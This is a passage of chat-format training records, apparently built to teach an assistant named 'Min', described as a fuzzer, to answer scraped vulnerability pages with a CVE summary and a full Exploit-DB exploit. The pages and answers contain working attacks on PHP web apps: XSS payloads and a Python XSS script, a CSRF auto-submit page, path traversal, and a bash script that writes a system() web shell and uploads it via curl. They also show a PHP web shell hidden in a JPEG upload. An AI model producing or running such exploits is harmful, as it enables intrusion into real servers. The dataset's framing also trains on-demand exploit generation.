interacting with your repositories and sending you notifications.\n          Learn more about blocking users.\n        \n\n              You must be logged in to block users.\n            \n\n        Add an optional note:\n\nPlease don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.\n\n          Block user\n        \n \n\nReport abuse\n\n        Contact GitHub support about this user’s behavior.\n        Learn more about reporting abuse.\n      \nReport abuse\n\n \n\n    Overview\n\n    Repositories\n    15\n\n    Projects\n    0\n\n      Packages\n      0\n\n    Stars\n    0\n \n\nMore\n \nOverview\nRepositories\nProjects\nPackages\nStars\n\n      Popular repositories\n    \n                CVE-2023-36168\n              \nCVE-2023-36168 \nPublic\n\n            An issue in AVG AVG Anti-Spyware v.7.5 allows an attacker to execute arbitrary code via a crafted script to the guard.exe component\n          \n\n                10\n              \n                2\n              \n                CVE-2023-36163\n              \nCVE-2023-36163 \nPublic\n\n            Cross Site Scripting vulnerability in IP-DOT BuildaGate v.BuildaGate5 allows a remote attacker to execute arbitrary code via a crafted script to the mc parameter of the URL\n          \n\n                2\n              \n                1\n              \n                Wi-Fi-Hacking-Tool\n              \nWi-Fi-Hacking-Tool \nPublic\n\n            This Tool was made by TraiLeR.\n          \n\nPython\n\n                1\n              \n                1\n              \n                Password_Generator\n              \nPassword_Generator \nPublic\n\n            Password Generator By Idan - Malihi\n          \n\nPython\n\n                1\n              \n                Web-App-Enumeration\n              \nWeb-App-Enumeration \nPublic\n\nShell\n\n                CVE-2023-36164\n              \nCVE-2023-36164 \nPublic\n\n            An issue in MiniTool Partition Wizard ShadowMaker v.12.7 allows an attacker to execute arbitrary code via the MTAgentService component\n          \n\n                1\n              \n          Something went wrong, please refresh the page to try again.\n          If the problem persists, check the GitHub status page\n          or contact support.\n        \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross Site Scripting vulnerability in IP-DOT BuildaGate v.BuildaGate5 allows a remote attacker to execute arbitrary code via a crafted script to the mc parameter of the URL.\n\nexploit\n/php/webapps/51581.txt\n# Exploit Title: BuildaGate5library v5 - Reflected Cross-Site Scripting (XSS)\n# Date: 06/07/2023\n# Exploit Author: Idan Malihi\n# Vendor Homepage: None\n# Version: 5\n# Tested on: Microsoft Windows 10 Pro\n# CVE : CVE-2023-36163\n\n#PoC:\nAn attacker just needs to find the vulnerable parameter (mc=) and inject the JS code like:\n'><script>prompt(\"XSS\");</script><div id=\"aa\n\nAfter that, the attacker needs to send the full URL with the JS code to the victim and inject their browser.\n\n#Payload:\ncompany_search_tree.php?mc=aaa'><script>prompt(\"XSS\");</script><div id=\"aaaa\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://yuyudhn.github.io/pos-codekop-vulnerability/\n\nPOS Codekop v2.0 Multiple Vulnerabilities - Problem Child\nSkip to primary navigation\nSkip to content\nSkip to footer\n\n          Problem Child\n          Just Another Security Engineer\nCVE\n\nWhoami\nToggle search\n\nToggle menu\n\nHome\n/\nPOS Codekop v2.0 Multiple Vulnerabilities\nYudha P.\nOffsec Say Try Harder!\n\nFollow\n\nGitHub\nLinkedIn\n\nEmail\nPOS Codekop v2.0 Multiple Vulnerabilities\n\n        \n          4 minute read\n        \n      \nResearcher\nDuring my vulnerability research on an open-source project, I discovered multiple vulnerabilities in POS Codekop, a simple web-based Point of Sales application using PHP & MYSQL.\nSoftware Details\nDetail about POS Codekop.\n\nParameter\nValue\nSoftware\nPOS Codekop\nDescription\nThe application is a Sales Goods (Cashier) application built with PHP MYSQL. It allows users to add, update/edit, and delete data, as well as search data using jQuery data tables. The user interface is designed using the Bootstrap Template.\nDeveloper\nfauzan1892\nVendor URL\nhttps://www.codekop.com/\nSoftware URL\nhttps://github.com/fauzan1892/pos-kasir-php\n\nCVE-2023-36345 - Unauthenticated CSRF\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36345\nClassification\nCross-Site Request Forgery\nDescription\nMissing CSRF protection at POS Codekop, This could allow a malicious actor to force higher privileged users to execute unwanted actions under their current authentication. For example: Settings update.\nRequired privilege\nUnauthenticated\nAffected Version\n2.0 (#0~gitebc5c29)\nPublicly disclosed\n23.06.2023\n\nPoC:\ncsrf.html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"http://localhost/research/pos-kasir-php/fungsi/edit/edit.php?pengaturan=ubah\" method=\"POST\">\n      <input type=\"hidden\" name=\"namatoko\" value=\"CV&#32;Daruttaqwa\" />\n      <input type=\"hidden\" name=\"alamat\" value=\"Ujung&#32;Harapan&#32;CSRF\" />\n      <input type=\"hidden\" name=\"kontak\" value=\"081234567890\" />\n      <input type=\"hidden\" name=\"pemilik\" value=\"Fauzan&#32;Falah\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Cross Site Request Forgery\n\nCVE-2023-36346 - Unauthenticated XSS\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36346\nClassification\nCross-site scripting\nDescription\nWe found a reflected cross-site scripting (XSS) vulnerability on the “print.php” endpoint, specifically on the “nm_member” parameter. This endpoint is unauthenticated, meaning it does not require any form of authentication to access.\nRequired privilege\nUnauthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\nPatched Version\n2.0 (#0~git391d436)\nPublicly disclosed\n23.06.2023\n\nVulnerable Code:\n<center>\n  <p><?php echo $toko['nama_toko'];?></p>\n  <p><?php echo $toko['alamat_toko'];?></p>\n  <p>Tanggal : <?php  echo date(\"j F Y, G:i\");?></p>\n  <p>Kasir : <?php  echo $_GET['nm_member'];?></p>\n</center>\n\nThe nm_member parameter is not secure because it lacks HTML sanitization, allowing attackers to inject XSS payloads.\nPoC:\nhttp://localhost/labs/pos-kasir/print.php?nm_member=%27/%3E%3Cimg%20src=x%20onerror=alert(1)%20/%3Eaa\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Unauthenticated Reflected Cross-Site Scripting\n\nCVE-2023-36347 - Broken Authentication\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36347\nClassification\nBroken Access Control\nDescription\nMissing authentication at /excel.php endpoint, could allow attacker to download selling data without authentication.\nRequired privilege\nUnauthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nPoC:\ncurl http://localhost/research/pos-kasir-php/excel.php\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Broken Authentication\n\nCVE-2023-36348 - Authenticated RCE\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36348\nClassification\nRemote code execution\nDescription\nThe application does not sanitize the filename parameter when sending data to /fungsi/edit/edit.php?gambar=user. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution.\nRequired privilege\nAuthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nVulnerable code:\nif ($_FILES['foto'][\"error\"] > 0) {\n      $output['error']= \"Error in File\";\n  } elseif (!in_array($_FILES['foto'][\"type\"], $allowedImageType)) {\n      echo '<script>alert(\"You can only upload JPG, PNG and GIF file\");window.location=\"../../index.php?page=user\"</script>';\n  } elseif (round($_FILES['foto'][\"size\"] / 1024) > 4096) {\n      echo '<script>alert(\"WARNING !!! Besar Gambar Tidak Boleh Lebih Dari 4 MB\");window.location=\"../../index.php?page=user\"</script>';\n  } else {\n      $dir = '../../assets/img/user/';\n      $tmp_name = $_FILES['foto']['tmp_name'];\n      $name = time().basename($_FILES['foto']['name']);\n      if (move_uploaded_file($tmp_name, $dir.$name)) {\n          $foto2 = $_POST['foto2'];\n--------------------\n\nTo prevent Remote Code Execution in the upload feature, relying solely on mime type checks is not sufficient. It is essential to include an file extension check as well.\nPoC:\nPOST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1\nHost: localhost\nContent-Length: 8934\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\n**Upgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarymVBHqH4m6KgKBnpa\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-User: ?1**\nSec-Fetch-Dest: document\nReferer: http://localhost/research/pos-kasir-php/index.php?page=user\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv\nConnection: close\n\n------WebKitFormBoundarymVBHqH4m6KgKBnpa\nContent-Disposition: form-data; name=\"foto\"; filename=\"asuka-rce.php\"\nContent-Type: image/jpeg\n\nÿØÿà JFIF  H H  ÿþ 6<?php passthru($_GET['cmd']); __halt_compiler(); ?>\nÿÛ C \n\n#%$\"\"!&+7/&)4)!\"0A149;>>>%.DIC<H7=>;ÿÛ C\n-----------------------------\n\nPHP Web Shell location:\n\nhttp://localhost/research/pos-kasir-php/assets/img/user/1687670330asuka-rce.php\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Authenticated RCE\n\nPath Traversal\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-37156\nClassification\nPath Traversal\nDescription\nThere is an unsafe way of using PHP’s include function in POS Codekop that allows attackers to perform a Path Traversal by accessing directories outside of admin/module/.\nRequired privilege\nAuthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nVulnerable code:\nindex.php\n  include 'admin/template/sidebar.php';\n          if(!empty($_GET['page'])){\n                  include 'admin/module/'.$_GET['page'].'/index.php';\n          }else{\n                  include 'admin/template/home.php';\n          }\n  include 'admin/template/footer.php';\n--------------------\n\nTo prevent path traversal vulnerabilities when using PHP’s include function, validate and sanitize user input, use absolute paths instead of relative ones, maintain a whitelist of allowed file names or paths, restrict access to included files, avoid dynamic file names whenever possible, disable directory listings, and keep your PHP version and libraries up to date. These practices help ensure that only intended files are included and limit the potential for unauthorized access to sensitive directories.\nPoC:\nmkdir /tmp/asuka\necho \"<?php phpinfo();\" | tee /tmp/asuka/index.php\nhttp://localhost/research/pos-kasir-php/index.php?page=../../../../../../../../tmp/asuka\nTimeline\n\n25 May 2023 - Found the vulnerability\n25 May 2023 - Contact the developer\n23 June 2023 - CVE assigned\n24 June 2023 - Article published\n\nReferences\n\nhttps://www.tenable.com/cve/CVE-2023-36348\nhttps://www.tenable.com/cve/CVE-2023-36347\nhttps://www.tenable.com/cve/CVE-2023-36346\nhttps://www.tenable.com/cve/CVE-2023-36345\n Tags: \n\nBroken Auth, \nCSRF, \nRCE, \nXSS\n\n Categories: \n\nCVE\n Updated: June 24, 2023\nShare on\n Twitter\n Facebook\n LinkedIn\nPrevious\nNext\n      Enter your search term...\n    \nFollow:\n Twitter\n Instagram\n Feed\n© 2024 Problem Child. Powered by Jekyll & Minimal Mistakes.\n\n\n"}, {"role": "assistant", "content": "descriptionsPOS Codekop v2.0 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the nm_member parameter at print.php.\n\nexploit\n/php/webapps/51549.py\n# Exploit Title: Sales of Cashier Goods v1.0 - Cross Site Scripting (XSS)\n# Date: 2023-06-23\n# country: Iran\n# Exploit Author: Amirhossein Bahramizadeh\n# Category : webapps\n# Dork : /print.php?nm_member=\n# Vendor Homepage: https://www.codekop.com/products/source-code-aplikasi-pos-penjualan-barang-kasir-dengan-php-mysql-3.html\n# Tested on: Windows/Linux\n# CVE : CVE-2023-36346\n\nimport requests\nimport urllib.parse\n\n# Set the target URL and payload\nurl = \"http://example.com/print.php\"\npayload = \"<script>alert('XSS')</script>\"\n\n# Encode the payload for URL inclusion\npayload = urllib.parse.quote(payload)\n\n# Build the request parameters\nparams = {\n    \"nm_member\": payload\n}\n\n# Send the request and print the response\nresponse = requests.get(url, params=params)\nprint(response.text)\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://yuyudhn.github.io/pos-codekop-vulnerability/\n\nPOS Codekop v2.0 Multiple Vulnerabilities - Problem Child\nSkip to primary navigation\nSkip to content\nSkip to footer\n\n          Problem Child\n          Just Another Security Engineer\nCVE\n\nWhoami\nToggle search\n\nToggle menu\n\nHome\n/\nPOS Codekop v2.0 Multiple Vulnerabilities\nYudha P.\nOffsec Say Try Harder!\n\nFollow\n\nGitHub\nLinkedIn\n\nEmail\nPOS Codekop v2.0 Multiple Vulnerabilities\n\n        \n          4 minute read\n        \n      \nResearcher\nDuring my vulnerability research on an open-source project, I discovered multiple vulnerabilities in POS Codekop, a simple web-based Point of Sales application using PHP & MYSQL.\nSoftware Details\nDetail about POS Codekop.\n\nParameter\nValue\nSoftware\nPOS Codekop\nDescription\nThe application is a Sales Goods (Cashier) application built with PHP MYSQL. It allows users to add, update/edit, and delete data, as well as search data using jQuery data tables. The user interface is designed using the Bootstrap Template.\nDeveloper\nfauzan1892\nVendor URL\nhttps://www.codekop.com/\nSoftware URL\nhttps://github.com/fauzan1892/pos-kasir-php\n\nCVE-2023-36345 - Unauthenticated CSRF\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36345\nClassification\nCross-Site Request Forgery\nDescription\nMissing CSRF protection at POS Codekop, This could allow a malicious actor to force higher privileged users to execute unwanted actions under their current authentication. For example: Settings update.\nRequired privilege\nUnauthenticated\nAffected Version\n2.0 (#0~gitebc5c29)\nPublicly disclosed\n23.06.2023\n\nPoC:\ncsrf.html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"http://localhost/research/pos-kasir-php/fungsi/edit/edit.php?pengaturan=ubah\" method=\"POST\">\n      <input type=\"hidden\" name=\"namatoko\" value=\"CV&#32;Daruttaqwa\" />\n      <input type=\"hidden\" name=\"alamat\" value=\"Ujung&#32;Harapan&#32;CSRF\" />\n      <input type=\"hidden\" name=\"kontak\" value=\"081234567890\" />\n      <input type=\"hidden\" name=\"pemilik\" value=\"Fauzan&#32;Falah\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Cross Site Request Forgery\n\nCVE-2023-36346 - Unauthenticated XSS\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36346\nClassification\nCross-site scripting\nDescription\nWe found a reflected cross-site scripting (XSS) vulnerability on the “print.php” endpoint, specifically on the “nm_member” parameter. This endpoint is unauthenticated, meaning it does not require any form of authentication to access.\nRequired privilege\nUnauthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\nPatched Version\n2.0 (#0~git391d436)\nPublicly disclosed\n23.06.2023\n\nVulnerable Code:\n<center>\n  <p><?php echo $toko['nama_toko'];?></p>\n  <p><?php echo $toko['alamat_toko'];?></p>\n  <p>Tanggal : <?php  echo date(\"j F Y, G:i\");?></p>\n  <p>Kasir : <?php  echo $_GET['nm_member'];?></p>\n</center>\n\nThe nm_member parameter is not secure because it lacks HTML sanitization, allowing attackers to inject XSS payloads.\nPoC:\nhttp://localhost/labs/pos-kasir/print.php?nm_member=%27/%3E%3Cimg%20src=x%20onerror=alert(1)%20/%3Eaa\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Unauthenticated Reflected Cross-Site Scripting\n\nCVE-2023-36347 - Broken Authentication\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36347\nClassification\nBroken Access Control\nDescription\nMissing authentication at /excel.php endpoint, could allow attacker to download selling data without authentication.\nRequired privilege\nUnauthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nPoC:\ncurl http://localhost/research/pos-kasir-php/excel.php\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Broken Authentication\n\nCVE-2023-36348 - Authenticated RCE\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-36348\nClassification\nRemote code execution\nDescription\nThe application does not sanitize the filename parameter when sending data to /fungsi/edit/edit.php?gambar=user. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution.\nRequired privilege\nAuthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nVulnerable code:\nif ($_FILES['foto'][\"error\"] > 0) {\n      $output['error']= \"Error in File\";\n  } elseif (!in_array($_FILES['foto'][\"type\"], $allowedImageType)) {\n      echo '<script>alert(\"You can only upload JPG, PNG and GIF file\");window.location=\"../../index.php?page=user\"</script>';\n  } elseif (round($_FILES['foto'][\"size\"] / 1024) > 4096) {\n      echo '<script>alert(\"WARNING !!! Besar Gambar Tidak Boleh Lebih Dari 4 MB\");window.location=\"../../index.php?page=user\"</script>';\n  } else {\n      $dir = '../../assets/img/user/';\n      $tmp_name = $_FILES['foto']['tmp_name'];\n      $name = time().basename($_FILES['foto']['name']);\n      if (move_uploaded_file($tmp_name, $dir.$name)) {\n          $foto2 = $_POST['foto2'];\n--------------------\n\nTo prevent Remote Code Execution in the upload feature, relying solely on mime type checks is not sufficient. It is essential to include an file extension check as well.\nPoC:\nPOST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1\nHost: localhost\nContent-Length: 8934\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\n**Upgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarymVBHqH4m6KgKBnpa\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-User: ?1**\nSec-Fetch-Dest: document\nReferer: http://localhost/research/pos-kasir-php/index.php?page=user\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv\nConnection: close\n\n------WebKitFormBoundarymVBHqH4m6KgKBnpa\nContent-Disposition: form-data; name=\"foto\"; filename=\"asuka-rce.php\"\nContent-Type: image/jpeg\n\nÿØÿà JFIF  H H  ÿþ 6<?php passthru($_GET['cmd']); __halt_compiler(); ?>\nÿÛ C \n\n#%$\"\"!&+7/&)4)!\"0A149;>>>%.DIC<H7=>;ÿÛ C\n-----------------------------\n\nPHP Web Shell location:\n\nhttp://localhost/research/pos-kasir-php/assets/img/user/1687670330asuka-rce.php\n\nI also provide a video about how to exploit this vulnerability.\n\nPOS Codekop v2.0 Authenticated RCE\n\nPath Traversal\nVulnerability Summary:\n\nParameter\nValue\nCVE ID\nCVE-2023-37156\nClassification\nPath Traversal\nDescription\nThere is an unsafe way of using PHP’s include function in POS Codekop that allows attackers to perform a Path Traversal by accessing directories outside of admin/module/.\nRequired privilege\nAuthenticated\nAffected Version\nv2.0 (#0~gitebc5c29)\n\nVulnerable code:\nindex.php\n  include 'admin/template/sidebar.php';\n          if(!empty($_GET['page'])){\n                  include 'admin/module/'.$_GET['page'].'/index.php';\n          }else{\n                  include 'admin/template/home.php';\n          }\n  include 'admin/template/footer.php';\n--------------------\n\nTo prevent path traversal vulnerabilities when using PHP’s include function, validate and sanitize user input, use absolute paths instead of relative ones, maintain a whitelist of allowed file names or paths, restrict access to included files, avoid dynamic file names whenever possible, disable directory listings, and keep your PHP version and libraries up to date. These practices help ensure that only intended files are included and limit the potential for unauthorized access to sensitive directories.\nPoC:\nmkdir /tmp/asuka\necho \"<?php phpinfo();\" | tee /tmp/asuka/index.php\nhttp://localhost/research/pos-kasir-php/index.php?page=../../../../../../../../tmp/asuka\nTimeline\n\n25 May 2023 - Found the vulnerability\n25 May 2023 - Contact the developer\n23 June 2023 - CVE assigned\n24 June 2023 - Article published\n\nReferences\n\nhttps://www.tenable.com/cve/CVE-2023-36348\nhttps://www.tenable.com/cve/CVE-2023-36347\nhttps://www.tenable.com/cve/CVE-2023-36346\nhttps://www.tenable.com/cve/CVE-2023-36345\n Tags: \n\nBroken Auth, \nCSRF, \nRCE, \nXSS\n\n Categories: \n\nCVE\n Updated: June 24, 2023\nShare on\n Twitter\n Facebook\n LinkedIn\nPrevious\nNext\n      Enter your search term...\n    \nFollow:\n Twitter\n Instagram\n Feed\n© 2024 Problem Child. Powered by Jekyll & Minimal Mistakes.\n\n\n"}, {"role": "assistant", "content": "descriptionsPOS Codekop v2.0 was discovered to contain an authenticated remote code execution (RCE) vulnerability via the filename parameter.\n\nexploit\n/php/webapps/51551.txt\n# Exploit Title: POS Codekop v2.0 - Authenticated Remote Code Execution (RCE)\n# Date: 25-05-2023\n# Exploit Author: yuyudhn\n# Vendor Homepage: https://www.codekop.com/\n# Software Link: https://github.com/fauzan1892/pos-kasir-php\n# Version: 2.0\n# Tested on: Linux\n# CVE: CVE-2023-36348\n# Vulnerability description: The application does not sanitize the filename\nparameter when sending data to /fungsi/edit/edit.php?gambar=user. An\nattacker can exploit this issue by uploading a PHP file and accessing it,\nleading to Remote Code Execution.\n# Reference: https://yuyudhn.github.io/pos-codekop-vulnerability/\n\n# Proof of Concept:\n1. Login to POS Codekop dashboard.\n2. Go to profile settings.\n3. Upload PHP script through Upload Profile Photo.\n\nBurp Log Example:\n```\nPOST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1\nHost: localhost\nContent-Length: 8934\nCache-Control: max-age=0\nsec-ch-ua:\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\n**Upgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data;\nboundary=----WebKitFormBoundarymVBHqH4m6KgKBnpa\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-User: ?1**\nSec-Fetch-Dest: document\nReferer: http://localhost/research/pos-kasir-php/index.php?page=user\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv\nConnection: close\n\n------WebKitFormBoundarymVBHqH4m6KgKBnpa\nContent-Disposition: form-data; name=\"foto\"; filename=\"asuka-rce.php\"\nContent-Type: image/jpeg\n\n첼횠첼횪 JFIF HH첼첸6<?php passthru($_GET['cmd']); __halt_compiler(); ?>\n첼횤C\n\n-----------------------------\n```\nPHP Web Shell location:\nhttp://localhost/research/pos-kasir-php/assets/img/user/[random_number]asuka-rce.php\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/1337kid/Piggery_CMS_multiple_vulns_PoC/tree/main/CVE-2023-37629\nPiggery_CMS_multiple_vulns_PoC/CVE-2023-37629 at main · 1337kid/Piggery_CMS_multiple_vulns_PoC · GitHub\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        1337kid\n \n/\n\nPiggery_CMS_multiple_vulns_PoC\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    0\n \n          Star\n 0\n  \nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\n    Files mainBreadcrumbsPiggery_CMS_multiple_vulns_PoC/CVE-2023-37629/Directory actionsMore optionsDirectory actionsMore optionsLatest commit HistoryHistory mainBreadcrumbsPiggery_CMS_multiple_vulns_PoC/CVE-2023-37629/TopFolders and filesNameNameLast commit messageLast commit dateparent directory..README.mdREADME.md  fuv.pngfuv.png  View all filesREADME.mdCVE-2023-37629\nProduct : Online Piggery Management System - 1.0\nVulnerability Type : Unauthenticated File Upload\nVendor of Product : Create Network NG\n\nDesc : An unauthenticated user can upload a php file by sending a POST request to \"add-pig.php\".\n\nVulnerable Code\n// file : add-pig.php\n...\n$res1_name = basename($_FILES['pigphoto']['name']);\n$tmp_name = $_FILES['pigphoto']['tmp_name'];\n$type = $_FILES['pigphoto']['type'];\n$max_size = 2097152;\n$size = $_FILES['pigphoto']['size'];\n\nif (isset($res1_name)) {\n\t$location = 'uploadfolder/';\n\t$move = move_uploaded_file($tmp_name, $locati$res1_name);\n\t$path1 = $location.$res1_nam\n\n\tif (!$move) {\n\t\t$fileerror = $_FILES['pigphoto']['error'];\n\t\t$message = $upload_errors[$fileerror];\n...\nPOC\n\n    \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsOnline Piggery Management System 1.0 is vulnerable to File Upload. An unauthenticated user can upload a php file by sending a POST request to \"add-pig.php.\"\n\nexploit\n/php/webapps/51598.sh\n#!/bin/bash\n# Exploit Title: Online Piggery Management System v1.0 - unauthenticated file upload vulnerability\n# Date: July 12 2023\n# Exploit Author: 1337kid\n# Software Link: https://www.sourcecodester.com/php/11814/online-pig-management-system-basic-free-version.html\n# Version: 1.0\n# Tested on: Ubuntu\n# CVE : CVE-2023-37629\n#\n# chmod +x exploit.sh\n# ./exploit.sh web_url\n# ./exploit.sh http://127.0.0.1:8080/\n\necho \"   _____   _____   ___ __ ___ ____   ________ __ ___ ___ \"\necho \"  / __\\\\ \\\\ / / __|_|_  )  \\\\_  )__ /__|__ /__  / /|_  ) _ \\\\\"\necho \" | (__ \\\\ V /| _|___/ / () / / |_ \\\\___|_ \\\\ / / _ \\\\/ /\\\\_, /\"\necho \"  \\\\___| \\\\_/ |___| /___\\\\__/___|___/  |___//_/\\\\___/___|/_/ \"\necho \"                         @1337kid\"\necho\n\nif [[ $1 == '' ]]; then\n    echo \"No URL specified!\"\n    exit\nfi\n\nbase_url=$1\n\nunauth_file_upload() {\n    # CVE-2023-37629 - File upload vuln\n    echo \"Generating shell.php\"\n#===========\ncat > shell.php << EOF\n<?php system(\\$_GET['cmd']); ?>\nEOF\n#===========\n    echo \"done\"\n    curl -s -F pigphoto=@shell.php -F submit=pwned $base_url/add-pig.php > /dev/null\n    req=$(curl -s -I $base_url\"uploadfolder/shell.php?cmd=id\" |  head -1 | awk '{print $2}')\n    if [[ $req == \"200\" ]]; then\n        echo \"Shell uploaded to $(echo $base_url)uploadfolder/shell.php\"\n    else\n        echo \"Failed to upload a shell\"\n    fi\n\n}\n\nreq=$(curl -I -s $base_url | head -1 | awk '{print $2}')\nif [[ $req -eq \"200\" ]]; then\n    unauth_file_upload\nelse\n    echo \"Error\"\n    